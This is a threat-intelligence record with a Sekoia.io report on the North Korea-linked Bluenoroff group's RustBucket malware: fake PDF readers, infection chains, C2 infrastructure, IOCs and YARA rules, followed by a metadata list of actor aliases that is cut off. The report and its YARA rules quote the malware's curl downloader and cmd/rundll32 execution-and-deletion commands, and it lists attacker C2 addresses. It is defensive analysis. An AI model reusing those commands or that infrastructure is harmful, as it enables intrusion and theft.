{
    "id": "a617329a-b3e3-47d9-a301-ee7e866db4dd",
    "created_at": "2023-06-05T02:06:42.066042Z",
    "updated_at": "2024-11-22T02:03:32.01458Z",
    "deleted_at": null,
    "sha1_hash": "b7b7062157a6f8a803a4c7b071cd543471080967",
    "title": "2023-05-22 - Bluenoroff’s RustBucket campaign",
    "authors": "",
    "file_creation_date": "2023-06-04T13:51:23Z",
    "file_modification_date": "2023-06-04T13:51:23Z",
    "file_size": 1506640,
    "plain_text": "Bluenoroff’s RustBucket campaign\nblog.sekoia.io/bluenoroffs-rustbucket-campaign/\n22 May 2023\n\nJamila B., Kilian Seznec, Charles M. and Threat & Detection Research Team - TDR May 22\n2023\n267 0\nRead it later Remove\n15 minutes reading\n\nLike DPRK soldiers\nIn April 2023, fellow security researchers at Jamf published a report on Bluenoroff’s\nRustBucket, a newly observed malware targeting macOS platform. Sekoia.io analysts\nfurther investigated Bluenoroff’s infrastructure and share their findings in this report.\nBluenoroff is a North Korea-nexus intrusion set, allegedly subordinated to RGB’s Bureau\n121 tasked with revenue generation since at least 2015. Since 2017, Bluenoroff was\nobserved conducting financially-driven campaigns targeting cryptocurrency exchanges\nand venture capital related entities in Europe, Asia, the U.S. and the UAE.\nSince the end of 2021 and through 2022, Bluenoroff continuously used the same TTPs.\nHowever, Sekoia.io analysts observed recent modifications, as described in the report\npreviously referenced.\n\nBluenoroff’s gone macOS\nSince at least December 2022, Bluenoroff was observed leveraging RustBucket, a Rust\nand Objective-C written malware targeting macOS running systems. This recent Bluenoroff\nactivity illustrates how intrusion sets turn to cross-platform language in their malware\ndevelopment efforts, further expanding their capabilities highly likely to broaden their\nvictimology. While other DPRK-nexus intrusion sets, including Lazarus, Kimsuky and more\nrecently Reaper were already reported targeting macOS, it is the first time Bluenoroff was\nobserved targeting macOS users, to the best of our knowledge.\nThe RustBucket infection chain consists of a macOS installer that installs a backdoored, yet\nfunctional, PDF reader. The fake PDF reader then requires opening a specific PDF file that\noperates as a key to trigger the malicious activity.\n1/15\n\nWhen opened in a classical PDF reader, the PDF document displays a message asking the\nuser to open the document in the proper reader (i.e. the backdoored one). When opened in\nthis reader, the PDF displays a nine pages document about a venture capital company that\nappears to be the printout of a legit company’s website. The fake PDF reader uses a\nhardcoded 100-bytes XOR key to decrypt the new content of the document and the C2\nserver configuration.\n\nFigure 1. Key PDF document when opened in a PDF Reader\nWhen the proper PDF file is submitted to the fake PDF reader, it requests its C2 server\nencoded in the PDF file using an HTTP POST request to download and execute a new\npayload. The new payload is the backdoor component of the RustBucket kill chain, collecting\ninformation about the compromised system, sending it to its C2 server and requesting for\ncommands.\nThis new technique is interesting as it makes it more complex to track. We need to find the\nfake readers and the right PDF file to get relevant results from sandboxes. While the usage\nof a modified PDF reader was already observed during Lazarus’ DreamJob campaign in\n2020, it is the first time we observe it to target macOS. Sekoia.io analysts created YARA\nrules and collected new samples complementing Jam’s findings, available in the IOCs\nsection.\n\nLooking through the Window(s) pane\nDuring our investigation on the macOS variant, Sekoia.io analysts identified a .NET version\nof RustBucket, with a similar GUI, developed using the library DevExpress.XtraPdfViewer.\nThe malware was embedded in a ZIP archive containing the PDF reader and the “key” PDF\nrequiring user interaction.\n\n2/15\n\nFigure 2. Windows RustBucket archive’s content\nSimilarly to the RustBucket macOS version, when the user opens the PDF file in another\nPDF reader, it opens a one-pager with a message stating the file is protected and must be\nopened with the “internal” reader. When the file is opened with the fake PDF reader, it prints\na sixteen pages document containing a list of contacts.\n\nFigure 3. (left) Key PDF document opened in Firefox, (right) Key PDF document\nopened in the Internal PDF viewer\nDuring our analysis, we observed that both Windows and MacOS RustBucket’s versions\nuse the same decryption key. The executable PdfViewer.exe decrypts the malicious PDF\nand calls the Create function of the DevExpress.Xpo.v19.2.dll Library with the C2 url as\nparameter (if a legitimate PDF is chosen, an error is returned ”Can’t decrypt PDF file”). Then\ntwo other DLLs are also used to load the backdoor, as detailed here above and in Figure 4.\n\nPdfViewer/DevExpress.Xpo.v19.2.dll\n3/15\n\nThe purpose of this DLL is to retrieve the process ID of an explorer.exe process. Then, the\nfunction Create of the DevExpress.XtraList.v19.2.dll library is called with the URL and the\nprocess ID as parameters.\nPdfViewer/DevExpress.XtraList.v19.2.dll\nThe purpose of this DLL is to load and call the DevExpress.Xpr.v19.2.dll library. This DLL\nchecks for some antivirus on the infected machine: Bitdefender, Kaspersky, Sophos,\nAvastSvc, Norton, Avira, AVG and WindowsDefender. If one of this antivirus is found, the\nDLL call the OpenProcess API to run the following command:\nrundll32.exe %s\\DevExpress.Xpr.v19.2.dll,Update\nIf there is no antivirus, the DLL perform code injection on the provided explorer.exe process.\nThe injected payload starts by decrypted itself into the DevExpress.Xpr.v19.2.dll.\nDevExpress.Xpr.v19.2.dll\nThis DLL is called via the Update function which gives back the execution flow to the\nDLLMain function with 0xD8E1 as reason code (instead of 0, 1, 2 or 3). Then a new thread is\ncreated. This backdoor collects information about the compromised machine (name, active\nprocesses, network configuration, etc.) and sends this information to the C2 using POST\nrequests. It also has the capability to load a next stage (we assess that this next stage is\nprovided by the C2).\nThe backdoor collects information about the compromised machine and the active processes\nand sends this information to the C2 using POST requests.\n\n4/15\n\nFigure 4. Windows RustBucket execution flow chart\n\nPivoting on the infrastructure\nPivoting on the infrastructure used to deliver RustBucket, Sekoia.io analysts retrieved\nadditional infrastructure not exclusively related to the RustBucket activity that we\nassociate to Bluenoroff with high confidence, used to deploy other malware through\nseveral infection chains. These infection chains notably include LNK, MSI, OneNote and\nVHD files. It is possible Bluenoroff is testing new infection chains and malware before\nshifting or expanding their TTPs.\n\n5/15\n\nBluenoroff’s observed initial intrusion vector includes phishing emails, as well as leveraging\nsocial networks such as LinkedIn. During our investigations, we identified the domain\nsarahbeery.docsend[.]me, further analysis led us to the following LinkedIn profile:\n\nFigure 5. LinkedIn profile allegedly used by Bluenoroff\nAs of the time of writing, TDR analysts could no longer find this profile on LinkedIn. We\nassess this likely was a profile used by Bluenoroff after it was leaked to engage with\ntheir targets, possibly followed up by a delivery of malicious documents through the\ndocsend sharing platform.\nWhile Bluenoroff was seen leveraging updated VHD and CAB files to bypass the Mark-ofthe-Web (MOTW) flag until the end of 2022, Sekoia.io did not observe these TTPs in 2023. It\nis almost certainly a reflection of Bluenoroff’s adaptation efforts after their TTPs were\ndocumented in open source, notably by Securelist. In March 2023, we observed new files\n(MSI file: 5c483473641807082e530744023044fd and One Note file:\n4e05597d308d2368625dc19e86a9ca22) containing similar commands to those used in the\nVHD files reported by Kaspersky.\nThose files were used to drop and execute 529c65521e8a07c8810b6d225f7e2a89 which is\na downloader for a curl-agent that Sekoia.io analysts did not retrieve at the time of writing.\ncmd.exe /c copy /b %s\\system32\\rund^ll3^2.e^xe %s\\rdl.e^xe & %s\\rdl.ex^e %s #1 %S\ncmd /c timeout /t 10 & Del /f /q “%s” & attrib -s -h “%s” & rundll32 “%s” #1 %S\ncmd /c timeout /t 10 & rundll32 “%s” #1 %S\ncurl -A cur1-agent -L %s -s -d dacurl -A cur1-agent -L %s -s -d dl\nAs per Sekoia.io analysts’ observations, the network infrastructure is used to host\nHTTP/HTTPS services leveraged by lure files. This infrastructure is used to download a later\nstage malware which often is a VBS acting as a backdoor, or a curl-agent downloader.\nDuring their investigation, Sekoia.io analysts created automatic trackers to monitor\nBluenoroff’s infrastructure evolution. In previous activities, the intrusion set setup\nHTTP/HTTPS servers with specific characteristics used to host a dozen domains notably\ntyposquatting IT, financial and investment companies.\n\n6/15\n\nBased on a TDR heuristic, we identified servers used to host domain typo-squatting\nlegitimate organisations, notably pertaining to entities involved in fund management and\nventure fund, crypto assets and blockchain, located in Europe, Asia, and North America.\n\nFigure 6. Financial and technology entities typo-squatted by Bluenoroff\nBased on previous open source publications and our own knowledge of this intrusion set, we\nassociate these domains to Bluenoroff with high confidence. A list of retrieved typosquatting\ndomains is available to Sekoia.io’s customers in the Intelligence Center.\nWhether Bluenoroff’s attempt to target these entities or simply masqueraded as those\nentities to target other individuals and / or organizations remains an intelligence gap at the\ntime of writing. Regardless, Sekoia.io TDR analysts assess this is in line with past\nBluenoroff’s activities, targeting finance-related institutions. Based on typosquatting\ndomains and Sekoia.io attributed levels of confidence, we identified a strong focus on Asia\nand the U.S.. While this almost certainly stems from the fact that these regions are\nparticularly active in the Fintech area, it is also likely part of Bluenoroff’s geographical\ntargeting assignment. We also retrieved domains indicating a targeting of Laos and Thailand.\n\n7/15\n\nFigure 7. Bluenoroff targets since September 2022\nOf note, we also observed that the group may use temporary C2 servers, when testing\nnew techniques, that they then discard rapidly. For instance, in November 2022, Bluenoroff\ntemporarily used a server to transition to using MSI and CAB files (149.28.247[.]34).\nSimilarly, the intrusion set sporadically used a specific server when experimenting with chm\n(Windows Helper) files (172.86.122[.]181) in December 2022.\n\nConclusion\nSekoia.io analysts assess this activity is part of Bluenoroff’s SnatchCrypto campaign,\nactive since 2017. It is in line with past observed malicious cyber activities, notably pertaining\nto Pyongyang’ strategic objective of revenue generation to evade sanctions. Of particular\ninterest are Bluenoroff’s observed efforts to develop their offensive capabilities, notably\nincluding crossplatform languages to their toolset, and expanding their victimology\nthrough the targeting of multiple environments. Sekoia.io analysts assess Bluenoroff’s\nactivities will almost certainly continue in the short to medium term.\n\nIoCs & Technical Details\nSamples’ first seen date relates to the time they were first submitted to VirusTotal. Of note, a\nfew samples we identified were tagged as NukeSped in open source, likely due to the\nconfusion between Lazarus and Bluenoroff activities. At the time of writing, Sekoia.io\nanalysts consider NukeSped to be a Lazarus signature malware. IOCs provided in Appendix\nare all associated to Bluenoroff with high confidence.\n\n8/15\n\nRustBucket MacOS version\n\n9/15\n\n2023-05-08\nJump Crypto Investment Agreement.zip\nba5e982596fd03bea98f5de96c1258e56327358e134ceecd1d68e54480533d92\nInternal PDF Viewer.app.zip\n3ed9f34fedca38130776e5adabae363ac797fe89087e04e0c93d83fd62a7a9a4\nZIP\n6ca3a2f4cef27dac9d28c1ec2b29a8fa09dfc6dbbaf58e00dddbf5c1dd3b3cc3\nMach-O - Internal PDF Viewer\nc28e4031129f3e6e5c6fbd7b1cebd8dd21b6f87a8564b0fb9ee741a9b8bc0197\nMach-O\ne2f177b8806923f21a93952b61aedbeb02d829a67a820a7aab5ee72512e3d646\nMach-O\nd6d367453c513445313be7339666e4faeeebeae71620c187012ea5ae2901df34\nPDF - Jump Crypto Investment Agreement.pdf (Key PDF)\n5f00106f7f15e0ca00df4dbb0eeccd57930b4b81bc9aa3fca0c5af4eda339ab7\nPDF - Readme.pdf (Instruction to use the fake reader)\nebad7317e1b01c2231bdbf37dfebdf656e3c8706e719fd37b66f0170b3d5cae0\n2023-05-02\nZIP Internal PDF Viewer.app.zip\ndda8a9e2a2e415be781a39fdf41f1551af2344f1b1a0ddf921d8aeba90343d1b\nMach-O Internal PDF Viewer\n46db9f2fc879bf643a8f05e2b35879b235cbb04aa06fe548f0bc7c7c02483cf3\nMach-O\n5072b28399c874f92e71793fa13207d946a28a2f5903365ac11ddf666d15d086\nMach-O\n3f0d5ddca2657044f4763ae53c4f33c8a7814ba451b60d24430a126674125624\n2023-04-23\nZIP - Internal PDF Viewer 2.app.zip\n61772375af1884fe73c5d154b8637dd62f26d23bc38d18462a88e2bbed483fd7\nSCPT - main.scpt\n7c66d2d75be43d2c17e75d37c39344a9b5d29ee5c5861f178aa7d9f34208eb48\ncloud.dnx[.]capital\n104.255.172[.]56\nZIP - Internal PDF Viewer.zip\nff8832355ae99ffd66d0fe9eda2d74efdf3ed87bb2a4c215b93ade93165f7c0b\nZIP - Internal PDF Viewer.app.zip\n83f457bc81514ec5e3ea123fc237811a36da6ce7f975ad56d62e34af4d1f37c0\nZIP - Internal PDF Viewer 3.app.zip\nb68bf400a23b1053f54911a2b826d341f6bf87c26bea5e6cf21710ee569a7aab\nMach-O - PdfWriter\n3b6f30369a4ee8bf9409d141b6d1b3fb4286c34984b5de005ed7431df549b17e\nlaos.hedgehogvc[.]us\n104.255.172[.]56\n2023-04-21\nMach-O - 703517604263\n9ca914b1cfa8c0ba021b9e00bda71f36cad132f27cf16bda6d937badee66c747\nMach-O\nec8f97d5595d92ec678ffbf5ae1f60ce90e620088927f751c76935c46aa7dc41\nMach-O\n7fccc871c889a4f4c13a977fdd5f062d6de23c3ffd27e72661c986fae6370387\n2023-03-02\nZIP - Internal PDF Viewer.app.zip\n\n10/15\n\nb448381f244dc0072abd4f52e01ca93efaebb2c0a8ea8901c4725ecb1b2b0656\nZIP - Pdf Viewer.zip\nc56a97efd6d3470e14193ac9e194fa46d495e3dddc918219cca530b90f01d11e\nMach-O - Internal PDF Viewer\nbea33fb3205319868784c028418411ee796d6ee3dfe9309f143e7e8106116a49\n2023-02-13 (creation date 2022-12-20)\nZIP - Pdf Viewer.zip\n0d6964fe763c2e6404cde68af2c5f86d34cf50a88bd81bc06bba739010821db0\nZIP - Internal PDF Viewer.app.zip\nea5fac3201a09c3c5c3701723ea9a5fec8bbc4f1f236463d651303f40a245452\nZIP - Internal PDF Viewer.app.zip\n9525f5081a5a7ab7d35cf2fb2d7524e0777e37fe3df62730e1e7de50506850f7\nMach-O - Internal PDF Viewer\ne74e8cdf887ae2de25590c55cb52dad66f0135ad4a1df224155f772554ea970c\nMach-O\n38106b043ede31a66596299f17254d3f23cbe1f983674bf9ead5006e0f0bf880\nMach-O\n7981ebf35b5eff8be2f3849c8f3085b9cec10d9759ff4d3afd46990520de0407\n\nWindows version of RustBucket\nZIP - PdfViewer.zip\n62a5c6a600051bca4f7b3d11508ca1f968006b71089c71bf87b83ea8b34188e3\nPDF - DOJ Report on Bizlato Investigation.pdf\n8e234482db790fa0a3d2bf5f7084ec4cfb74bffd5f6cbdc5abdbc1350f58e3fe\nDLL - DevExpress.Xpr.v19.2.dll\nf603713bffb9e040bedfd0bb675ff5a6b3205d8bd4e1a3309ea6d1b608871184\nDLL - DevExpress.XtraList.v19.2.dll\n31cec2803bfc7750930d5864400388732a822da96c3f79c98ddee03949aa6a2d\nEXE - PdfViewer.exe\nb3cb7d0b656e8e4852def8548d2cf1edc4e64116434e1f2d9c9b150ee0f9861e\nsafe.doc-share[.]cloud\n172.93.181[.]221\nKey PDF file 2\nPDF - DOJ Report on Bizlato Investigation_asistant.pdf\n07d206664a8d397273e69ce37ef7cf933c22e93b62d95b673d6e835876feba06\nsafe.doc-share[.]cloud\n\nIP and domains\nActive Bluenoroff C2 servers\n104.156.149[.]130 (2023-04-18 - today)\n104.255.172.52 (2023-03-18 - today)\n104.234.147[.]28 (2023-01-21 - today)\n104.168.138.7 (2023-03-17 - today)\n104.168.167[.]88 (2022-10-17 - today)\n155.138.159.45 (2022-09-20 - today)\n\n11/15\n\nInactive servers\n104.255.172[.]56 (2022-09-15 - 2023-04-11)\n172.93.181[.]221 (2022-12-28 - 2023-03-06)\n172.86.121[.]143 (2022-10-31 - 2022-12-21)\n172.86.121[.]130 (2022-10-25 - 2023-01-24)\n149.28.247[.]34 (2022-11-11 - 2022-11-11)\n152.89.247[.]87 (2022-09-15 - 2022-10-24)\n104.168.174[.]80 (2022-06-28 - 2022-09-16)\n149.248.52[.]31 (2022-08-05 - 2022-08-31)\n155.138.219[.]140 (2022-07-17 - 2022-08-16)\n\nYARA rules\n\n12/15\n\nrule apt_Bluenoroff_downloader_mac_RustBucket {\nmeta:\nid =\"5a003b68-ad9a-47f9-b157-dd898181dac2\"\nversion = \"1.0\"\nmalware = \"RustBucket\"\ndescription = \"RustBucket fake PDF reader\"\nsource = \"SEKOIA\"\ncreation_date = \"2023-04-24\"\nclassification = \"TLP:WHITE\"\nreference = \"https://tinyurl.com/5n7f56a8\"\nhash = \"606bce13161693844b9eb36c96554883\"\nhash = \"b93d7b7b30207249c1c683df16bad107\"\nhash = \"ca86579220eecfaede268d1520d07fae\"\nhash = \"f8800dd176487601ccf2e27c094b297b\"\nstrings:\n$down_exec1 = \"_down_update_run\" nocase\n$down_exec2 = \"downAndExec\" nocase\n$encrypt1 = \"_encrypt_pdf\"\n$encrypt2 = \"_encrypt_data\"\n$error_msg1 = \"_alertErr\"\n$error_msg2 = \"_show_error_msg\"\n$view_pdf1 = \"-[PEPWindow view_pdf:]\"\n$view_pdf2 = \"-[PEPWindow viewPDF:]\"\ncondition:\n(uint32be(0) == 0xcafebabe or uint32be(0) == 0xcffaedfe)\nand 5 of them\nand filesize > 50KB\n}\nrule apt_Bluenoroff_implant_mac_RustBucket: TESTING {\nmeta:\nid = \"fcbb745d-7f56-4c51-9db5-427da22a0c68\"\nversion = \"1.0\"\nmalware = \"RustBucket\"\ndescription = \"Detect the RustBucket malware\"\nsource = \"SEKOIA\"\ncreation_date = \"2023-04-24\"\nclassification = \"TLP:WHITE\"\nhash = \"f90b544f89cfbe38aee18024d7c39e40\"\nreference = \"https://tinyurl.com/5n7f56a8\"\nstrings:\n$ = \"/Users/hero/\"\n$ = \"PATHIpv6Ipv4Bodyslotpath\"\ncondition:\n(uint32be(0) == 0xcafebabe or uint32be(0) == 0xcffaedfe) and all of them\n}\nrule apt_Bluenoroff_downloader_win_curl_agent: TESTING {\nmeta:\nid = \"ddeb2d8f-1b10-4a33-b768-d19412e8551a\"\nversion = \"1.0\"\nintrusion_set = \"Bluenoroff\"\n\n13/15\n\ndescription = \"Detect the downloader used by Bluenoroff to install it\nCurlAgent\"\nsource = \"SEKOIA\"\ncreation_date = \"2023-05-02\"\nclassification = \"TLP:WHITE\"\nstrings:\n$ = \"%s\\\\marcoor.dll\" wide\n$ = \"curl -A cur1-agent -L %s -s -d dl\"\n$ = \"curl -A cur1-agent -L %s -s -d da\"\n$ = \"cmd /c timeout /t 10 & rundll32 \\\"%s\\\" #1\" wide\n$ = \"cmd /c timeout /t 10 & Del /f /q \\\"%s\\\" & attrib -s -h \\\"%s\\\" &\nrundll32 \\\"%s\\\" #1\" wide\ncondition:\n3 of them\n}\n\nAppendix 1. Bluenoroff’s infection chain.\nThe classical infection chain observed is ZIP > LNK & PDF\nAs part of their phishing activities, Bluenoroff’s operators send their targets a ZIP archive.\nThe archive contains a non-malicious PDF document and a LNK file masquerading as a TXT\nfile purportedly containing a password to read the PDF, or masquerading as a PDF reader.\nLaunching the LNK file results in downloading a Javascript file from Bluenoroff-controlled C2\nserver and executing it using mshta.exe. The downloaded file is an obfuscated Javascript:\n5ca7c871dfe24b27b5cf7e9bf087f44c7620d78a1d4fa76373f22abedbdf8f82\nThe obfuscation method is straightforward and consists in encoding some characters in UTF8 and Hex. This script decodes its base64 block, writes it in a file ”tyrbz.js” and runs it with a\ncommand line containing the C2 domain as argument. The base64 encoded part is a script\ndropped on the computer and executed with the C2 domain as argument. The script\nrequests the domain using an HTTP POST request, decodes the base64 encoded response\nand executes it using ‘eval()‘. The script attempts to contact the C2 server every 15 seconds\nand acts as a backdoor, allowing the attacker to send commands and scripts to be executed.\nWhile we identified a few changes in 2023, this infection chain remains the most frequently\nobserved.\n\nChat with our team!\nWould you like to know more about our solutions?\nDo you want to discover our XDR and CTI products?\nDo you have a cybersecurity project in your organization?\nMake an appointment and meet us!\nContact us\n14/15\n\nThank you for reading this blogpost. Feel free to share your feedback, and read other TDR\nreports here :\n\n15/15",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-05-22 - Bluenoroff’s RustBucket campaign.pdf"
    ],
    "report_names": [
        "2023-05-22 - Bluenoroff’s RustBucket campaign.pdf"
    ],
    "threat_actors": [
        {
            "id": "1bdb91cf-f1a6-4bed-8cfa-c7ea1b635ebd",
            "created_at": "2022-10-25T16:07:23.766784Z",
            "updated_at": "2024-11-22T02:02:01.069348Z",
            "deleted_at": null,
            "main_name": "Bluenoroff",
            "aliases": [
                "APT 38",
                "ATK 117",
                "Alluring Pisces",
                "Black Alicanto",
                "Bluenoroff",
                "CTG-6459",
                "Copernicium",
                "Nickel Gladstone",
                "Sapphire Sleet",
                "Selective Pisces",
                "Stardust Chollima",
                "T-APT-15",
                "TA444",
                "TAG-71",
                "TEMP.Hermit"
            ],
            "source_name": "ETDA:Bluenoroff",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2024-11-22T02:02:01.164557Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f426f0a0-faef-4c0e-bcf8-88974116c9d0",
            "created_at": "2022-10-25T15:50:23.240383Z",
            "updated_at": "2024-11-22T02:00:52.294597Z",
            "deleted_at": null,
            "main_name": "APT38",
            "aliases": [
                "APT38",
                "NICKEL GLADSTONE",
                "BeagleBoyz",
                "Bluenoroff",
                "Stardust Chollima",
                "Sapphire Sleet",
                "COPERNICIUM"
            ],
            "source_name": "MITRE:APT38",
            "tools": [
                "ECCENTRICBANDWAGON",
                "HOPLIGHT",
                "Mimikatz",
                "KillDisk",
                "DarkComet"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2024-11-22T02:02:53.101712Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2024-11-22T02:02:53.099195Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2024-11-22T02:02:53.098302Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2024-11-22T02:00:02.4824Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Hidden Cobra",
                "Nickel Academy",
                "ATK3",
                "Sapphire Sleet",
                "TA404",
                "BeagleBoyz",
                "Bureau 121",
                "Group 77",
                "Operation GhostSecret",
                "APT-C-26",
                "NICKEL GLADSTONE",
                "ATK117",
                "G0082",
                "Dark Seoul",
                "Diamond Sleet",
                "Andariel",
                "Appleworm",
                "COPERNICIUM",
                "Operation DarkSeoul",
                "Unit 121",
                "Bluenoroff",
                "G0032",
                "DEV-1222",
                "Labyrinth Chollima",
                "APT38",
                "Stardust Chollima",
                "Whois Hacking Team",
                "Citrine Sleet",
                "DEV-0139",
                "Lazarus group",
                "APT 38",
                "Hastati Group",
                "NewRomanic Cyber Army Team",
                "Subgroup: Bluenoroff",
                "Operation Troy",
                "Operation AppleJeus",
                "COVELLITE"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2024-11-22T02:00:02.551126Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "G0086",
                "APT43",
                "Emerald Sleet",
                "THALLIUM",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Thallium",
                "Springtail",
                "Black Banshee",
                "Operation Stolen Pencil"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark",
                "RevClient"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2024-11-22T02:00:52.30662Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2024-11-22T02:02:01.154803Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2024-11-22T02:02:01.064081Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
